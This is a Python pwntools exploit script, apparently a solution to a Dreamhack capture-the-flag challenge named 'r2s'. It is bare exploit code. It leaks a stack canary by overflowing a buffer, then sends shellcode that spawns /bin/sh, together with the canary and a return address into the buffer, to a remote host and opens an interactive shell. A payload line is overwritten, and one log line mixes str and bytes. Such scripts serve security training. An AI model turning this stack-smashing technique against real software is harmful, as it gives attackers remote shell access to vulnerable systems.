from pwn import*
context.arch='amd64'
context.log_level = 'debug'

elf = ELF('./r2s')

host = 'host3.dreamhack.games'
port = 12207
#r = process('./r2s')
r = remote(host, port)
shellcode = asm(shellcraft.sh())

rbp_distance = 96
canary_distance = rbp_distance - 8

leak_canary = b'A'*(canary_distance + 1)

r.recvuntil('Address of the buf: ')
rbp=int(r.recvline(), 16)

r.sendafter('Input: ', leak_canary)

r.recvuntil(leak_canary)

leak = r.recvn(7)
canary = u64(b'\x00' + leak)

log.info('[+] shellcode = '+shellcode)
log.info('[+] rbp = '+hex(rbp))
log.info('[+] canary='+hex(canary))

payload = shellcode + b'A' * (0x58 - len(shellcode))
payload = shellcode.ljust(canary_distance, b'A')
payload += p64(canary)
payload += b'A'*0x8
payload += p64(rbp)

r.sendafter("Input: ",payload)

r.interactive()

